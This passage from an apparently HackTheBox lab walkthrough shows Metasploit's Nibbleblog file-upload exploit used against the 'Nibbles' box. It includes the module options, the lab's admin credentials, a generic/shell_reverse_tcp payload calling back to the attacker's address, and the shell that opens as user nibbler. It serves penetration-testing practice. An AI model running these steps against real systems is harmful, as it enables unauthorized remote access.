* As discussed earlier, there is also a `Metasploit` module that works for this box.
* It is considerably more straightforward, but it is worth practicing both methods to become familiar with as many tools and techniques as possible.
* Start `Metsaploit` from your attack box by typing `msfconsole`. Once loaded, we can search for the exploit.
```shell-session
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description

-  ----                                       ---------------  ----       -----  -----------

   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```
* We can then type `use 0` to load the selected exploit. Set the `rhosts` option as the target IP address and `lhosts` as the IP address of your `tun0` adapter (the one that comes with the VPN connection to HackTheBox).
```shell-session
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
rhosts => 10.129.42.190
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
lhost => 10.10.14.2
```
* Type show options to see what other options need to be set.
```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

  Name       Current Setting  Required  Description
----       ---------------  --------  -----------
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the web application
  USERNAME                    yes       The username to authenticate with
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
----   ---------------  --------  -----------
  LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
--  ----
  0   Nibbleblog 4.0.3
```
* We need to set the admin username and password `admin:nibbles` and the `TARGETURI` to `nibbleblog`.
```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
targeturi => nibbleblog
```
* We also need to change the payload type. For our purposes let's go with `generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.
```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  nibbleblog       yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
   LPORT  4444            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
* From here, we can follow the same privilege escalation path.